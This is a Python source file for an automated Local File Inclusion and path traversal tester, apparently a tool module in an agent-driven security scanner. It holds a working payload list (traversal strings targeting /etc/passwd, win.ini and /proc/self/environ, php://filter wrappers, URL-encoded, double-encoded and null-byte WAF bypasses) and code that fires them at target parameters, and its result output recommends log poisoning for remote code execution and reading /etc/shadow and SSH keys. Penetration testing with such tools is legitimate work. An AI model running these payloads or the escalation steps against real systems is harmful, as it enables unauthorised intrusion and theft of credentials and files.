"""Python-native Local File Inclusion (LFI) / Path Traversal tester.

Detection strategy:
1. Identify candidate parameters: query string params whose names suggest file paths
   (``file``, ``page``, ``path``, ``template``, ``include``, etc.) plus all others.
2. Inject traversal payloads targeting well-known files:
   - Linux:   ``/etc/passwd`` (confirmed by ``root:x:0:0``)
   - Windows: ``windows\\win.ini`` (confirmed by ``[boot loader]`` or ``[fonts]``)
3. Try WAF-bypass variants: URL encoding, double-encoding, ``....//`` obfuscation.
4. Null byte extension bypass: ``%00`` / ``%2500`` to truncate filename checks
   on directory listing endpoints (e.g. ``/ftp/``).
5. PHP-specific: ``php://filter`` wrapper to detect PHP app LFI.

Severity: High (read-only file access). Escalation to RCE via log poisoning
or PHP wrappers is handled by the Planner when ``vuln_lfi`` is discovered in
the AttackGraph.
"""

from __future__ import annotations

import json
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

logger = logging.getLogger("security_mcp.scanners.lfi_tester")

# ---------------------------------------------------------------------------
# Payloads: (payload, success_pattern, platform, encoding_note)
# ---------------------------------------------------------------------------

_LFI_PAYLOADS: list[tuple[str, str, str, str]] = [
    # --- Linux plain ---
    ("../../../etc/passwd", r"root:x:0:0", "linux", "plain"),
    ("../../../../etc/passwd", r"root:x:0:0", "linux", "plain"),
    ("../../../../../etc/passwd", r"root:x:0:0", "linux", "plain"),
    ("../../../../../../etc/passwd", r"root:x:0:0", "linux", "plain"),
    ("../../../../../../../etc/passwd", r"root:x:0:0", "linux", "plain"),
    # --- Linux WAF bypass: ....// ---
    ("....//....//....//etc/passwd", r"root:x:0:0", "linux", "double_dot_slash"),
    # --- Linux URL encoded ---
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", r"root:x:0:0", "linux", "url_encoded"),
    ("..%2F..%2F..%2Fetc%2Fpasswd", r"root:x:0:0", "linux", "url_partial"),
    # --- Linux double-encoded ---
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", r"root:x:0:0", "linux", "double_encoded"),
    # --- Windows plain ---
    ("..\\..\\..\\windows\\win.ini", r"\[boot loader\]|\[fonts\]", "windows", "plain"),
    ("..\\..\\..\\..\\windows\\win.ini", r"\[boot loader\]|\[fonts\]", "windows", "plain"),
    # --- Windows URL encoded ---
    ("..%5C..%5C..%5Cwindows%5Cwin.ini", r"\[boot loader\]|\[fonts\]", "windows", "url_encoded"),
    # --- Null byte extension bypass (Node.js, legacy PHP, Java) ---
    ("../../../etc/passwd%00", r"root:x:0:0", "linux", "null_byte"),
    ("../../../etc/passwd%00.html", r"root:x:0:0", "linux", "null_byte_ext"),
    ("../../../etc/passwd%2500", r"root:x:0:0", "linux", "double_encoded_null"),
    ("../../../etc/passwd%2500.md", r"root:x:0:0", "linux", "null_byte_ext_md"),
    # --- Linux /proc targets ---
    ("../../../proc/self/environ", r"PATH=|HOME=|USER=|HOSTNAME=", "linux", "proc"),
    # --- PHP stream wrappers ---
    (
        "php://filter/convert.base64-encode/resource=index.php",
        r"^[A-Za-z0-9+/=]{20,}",  # base64 output of a PHP file
        "php",
        "php_filter",
    ),
    (
        "php://filter/read=string.rot13/resource=index.php",
        r"<\?cuc",  # rot13 of "<?php"
        "php",
        "php_filter_rot13",
    ),
]

# Parameters that commonly accept file paths (tested first)
_PATH_PARAM_NAMES: frozenset[str] = frozenset(
    {
        "file",
        "page",
        "path",
        "template",
        "include",
        "load",
        "view",
        "doc",
        "document",
        "img",
        "image",
        "filename",
        "dir",
        "folder",
        "module",
        "lang",
        "locale",
        "layout",
        "content",
        "tpl",
        "src",
        "source",
    }
)


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------


@dataclass
class LfiVulnerability:
    """A single LFI/Path Traversal finding."""

    param: str
    payload: str
    platform: str  # "linux" | "windows" | "php"
    encoding: str
    evidence: str
    location: str = "GET"
    confidence: float = 0.5


@dataclass
class LfiResult:
    """Complete LFI test result."""

    target: str
    vulnerable: bool = False
    vulnerabilities: list[LfiVulnerability] = field(default_factory=list)
    params_tested: int = 0
    duration_ms: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        """Serialise to JSON-friendly dict."""
        return {
            "target": self.target,
            "vulnerable": self.vulnerable,
            "vulnerabilities": [
                {
                    "param": v.param,
                    "payload": v.payload,
                    "platform": v.platform,
                    "encoding": v.encoding,
                    "evidence": v.evidence,
                    "location": v.location,
                    "confidence": v.confidence,
                }
                for v in self.vulnerabilities
            ],
            "params_tested": self.params_tested,
            "duration_ms": round(self.duration_ms, 2),
            "summary": (
                f"{len(self.vulnerabilities)} path traversal "
                f"{'vulnerability' if len(self.vulnerabilities) == 1 else 'vulnerabilities'} found"
                if self.vulnerabilities
                else "No LFI/path traversal found"
            ),
            "next_steps": (
                ["Try log poisoning for RCE", "Read sensitive files: /etc/shadow, SSH keys, config files"]
                if self.vulnerabilities
                else []
            ),
        }


# ---------------------------------------------------------------------------
# LFI detection engine
# ---------------------------------------------------------------------------


class LfiTester:
    """Multi-payload LFI / Path Traversal tester.

    Parameters
    ----------
    timeout:
        HTTP request timeout in seconds.
    """

    def __init__(
        self,
        timeout: float = 10.0,
        extra_headers: dict[str, str] | None = None,
        waf_evasion: bool = False,
    ) -> None:
        self.timeout = timeout
        self._extra_headers = extra_headers or {}
        self._waf_evasion = waf_evasion

    async def test(
        self,
        url: str,
        params: list[str] | None = None,
        method: str = "GET",
        body: dict[str, str] | None = None,
    ) -> LfiResult:
        """Run LFI tests against a target URL.

        Args:
            url: Target URL (with or without query parameters).
            params: Specific parameter names to test. ``None`` auto-detects.
            method: HTTP method (``GET`` or ``POST``).
            body: POST body parameters.

        Returns:
            ``LfiResult`` with all discovered vulnerabilities.
        """
        start = time.monotonic()
        result = LfiResult(target=url)

        all_params = self._detect_params(url, params, body)
        # Prioritise path-like params but test all
        path_params = [(p, loc) for p, loc in all_params if p.lower() in _PATH_PARAM_NAMES]
        other_params = [(p, loc) for p, loc in all_params if p.lower() not in _PATH_PARAM_NAMES]
        ordered_params = path_params + other_params

        result.params_tested = len(ordered_params)

        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
            headers=self._extra_headers,
        ) as client:
            for param_name, location in ordered_params:
                vuln = await self._test_param(client, url, param_name, location, method, body)
                if vuln:
                    result.vulnerabilities.append(vuln)
                    result.vulnerable = True
                    # One confirmed LFI per parameter is enough — move on
                    break

            # Path-based null byte test for directory listings (e.g. /ftp/)
            if not result.vulnerable:
                path_vuln = await self._test_path_null_byte(client, url)
                if path_vuln:
                    result.vulnerabilities.append(path_vuln)
                    result.vulnerable = True

        result.duration_ms = (time.monotonic() - start) * 1000
        logger.info(
            "LFI test complete: %s — %d params, %d vulns, %.0fms",
            url,
            result.params_tested,
            len(result.vulnerabilities),
            result.duration_ms,
        )
        return result

    # ------------------------------------------------------------------
    # Path-based null byte bypass (directory listings like /ftp/)
    # ------------------------------------------------------------------

    async def _test_path_null_byte(
        self,
        client: httpx.AsyncClient,
        url: str,
    ) -> LfiVulnerability | None:
        """Test null byte extension bypass on directory listings.

        Targets endpoints like ``/ftp/`` where the server enforces a file
        extension whitelist.  A null byte (``%2500`` / ``%00``) truncates
        the checked filename so the server sees ``.md`` but the filesystem
        reads only the part before the null byte.
        """
        try:
            resp = await client.get(url)
        except httpx.HTTPError:
            return None
        if resp.status_code != 200:
            return None

        # Extract filenames from directory listing (href links)
        filenames = re.findall(r'href="([^"]*?\.\w{1,6})"', resp.text)
        if not filenames:
            return None

        # Establish a control response for a file that should not exist
        base_url = url.rstrip("/")
        try:
            control_resp = await client.get(
                f"{base_url}/nonexistent_secmcp_probe_4f8a.md"
            )
            control_status = control_resp.status_code
            control_len = len(control_resp.text)
        except httpx.HTTPError:
            control_status = 0
            control_len = 0

        null_suffixes = ["%2500.md", "%2500.pdf", "%2500.html", "%00.md", "%00.html"]

        for filename in filenames[:10]:
            # Skip files that already have a commonly allowed extension
            lower = filename.lower()
            if lower.endswith((".md", ".pdf", ".html", ".htm")):
                continue

            for suffix in null_suffixes:
                test_path = f"{base_url}/{filename}{suffix}"
                try:
                    test_resp = await client.get(test_path)
                except httpx.HTTPError:
                    continue

                if test_resp.status_code != 200 or len(test_resp.text) < 20:
                    continue

                # If control returned the same status & similar size → error page
                if (
                    control_status == test_resp.status_code
                    and abs(control_len - len(test_resp.text)) < 50
                ):
                    continue

                logger.info(
                    "Null byte path traversal confirmed: %s (%d bytes)",
                    test_path,
                    len(test_resp.text),
                )
                return LfiVulnerability(
                    param="path",
                    payload=f"{filename}{suffix}",
                    platform="any",
                    encoding="null_byte",
                    evidence=(
                        f"Null byte extension bypass at {test_path} returned "
                        f"{len(test_resp.text)} bytes (status "
                        f"{test_resp.status_code}). Preview: "
                        f"{test_resp.text[:200]}..."
                    ),
                    location="PATH",
                    confidence=0.8,
                )

        return None

    # ------------------------------------------------------------------
    # Parameter detection
    # ------------------------------------------------------------------

    def _detect_params(
        self,
        url: str,
        explicit_params: list[str] | None,
        body: dict[str, str] | None,
    ) -> list[tuple[str, str]]:
        """Detect testable parameters from URL and body."""
        params: list[tuple[str, str]] = []
        parsed = urlparse(url)
        for p in parse_qs(parsed.query):
            params.append((p, "GET"))
        if body:
            for p in body:
                params.append((p, "POST"))
        if explicit_params:
            params = [(p, loc) for p, loc in params if p in explicit_params]
        return params

    # ------------------------------------------------------------------
    # HTTP helper
    # ------------------------------------------------------------------

    async def _send_with_payload(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        payload: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
    ) -> httpx.Response | None:
        """Inject payload into a parameter and send the request."""
        try:
            if location == "GET":
                parsed = urlparse(url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [payload]
                injected = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                return await client.get(injected)
            else:
                injected_body = dict(body or {})
                injected_body[param] = payload
                return await client.post(url, data=injected_body)
        except httpx.HTTPError as exc:
            logger.debug("LFI HTTP error (param=%s): %s", param, exc)
            return None

    # ------------------------------------------------------------------
    # Per-parameter testing
    # ------------------------------------------------------------------

    # Confidence map: success regex pattern -> confidence score
    _CONFIDENCE_BY_PATTERN: dict[str, float] = {
        r"root:x:0:0": 0.9,
        r"\[boot loader\]|\[fonts\]": 0.9,
        r"PATH=|HOME=|USER=|HOSTNAME=": 0.9,
        r"^[A-Za-z0-9+/=]{20,}": 0.7,
        r"<\?cuc": 0.7,
    }

    async def _test_param(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
    ) -> LfiVulnerability | None:
        """Test one parameter against all LFI payloads."""
        payloads: list[tuple[str, str, str, str]] = list(_LFI_PAYLOADS)
        if self._waf_evasion:
            from security_mcp.scanners._encoder import PayloadEncoder

            extra: list[tuple[str, str, str, str]] = []
            for p, success_re_str, plat, enc in payloads:
                double_enc = PayloadEncoder.url_double_encode(p)
                if double_enc != p:
                    extra.append((double_enc, success_re_str, plat, "waf_double_encoded"))
                null_byte = PayloadEncoder.null_byte_insert(p)
                if null_byte != p:
                    extra.append((null_byte, success_re_str, plat, "waf_null_byte"))
            payloads.extend(extra)

        for payload, success_re, platform, encoding in payloads:
            resp = await self._send_with_payload(client, url, param, payload, location, method, body)
            if resp is None:
                continue

            match = re.search(success_re, resp.text)
            if match:
                logger.info(
                    "LFI confirmed: param=%s, payload=%r, platform=%s",
                    param,
                    payload,
                    platform,
                )
                # Extract surrounding context as evidence
                idx = match.start()
                snippet_start = max(0, idx - 60)
                snippet_end = min(len(resp.text), match.end() + 60)
                snippet = resp.text[snippet_start:snippet_end]

                confidence = self._CONFIDENCE_BY_PATTERN.get(success_re, 0.5)

                return LfiVulnerability(
                    param=param,
                    payload=payload,
                    platform=platform,
                    encoding=encoding,
                    evidence=(
                        f"Payload '{payload[:60]}' triggered pattern match "
                        f"'{success_re}' in response. Context: ...{snippet}..."
                    ),
                    location=location,
                    confidence=confidence,
                )

        return None


# ---------------------------------------------------------------------------
# Tool wrapper for ToolRegistry
# ---------------------------------------------------------------------------


async def python_lfi_test(
    url: str,
    params: str | None = None,
    method: str = "GET",
    headers: str = "",
    waf_evasion: bool = False,
) -> str:
    """Test URL parameters for Local File Inclusion / Path Traversal.

    Args:
        url: Target URL with query parameters to test.
        params: Comma-separated parameter names. Auto-detect if omitted.
        method: HTTP method (``GET`` or ``POST``).
        headers: JSON string of extra HTTP headers for authenticated testing,
            e.g. ``'{"Authorization": "Bearer token123"}'``. Default: ``""``.
        waf_evasion: Enable WAF bypass encoding for payloads. Default: ``False``.

    Returns:
        JSON string with ``LfiResult`` data.
    """
    param_list = params.split(",") if params else None
    extra_headers: dict[str, str] = json.loads(headers) if headers else {}
    tester = LfiTester(extra_headers=extra_headers, waf_evasion=waf_evasion)
    result = await tester.test(url, params=param_list, method=method)
    return json.dumps(result.to_dict(), indent=2)
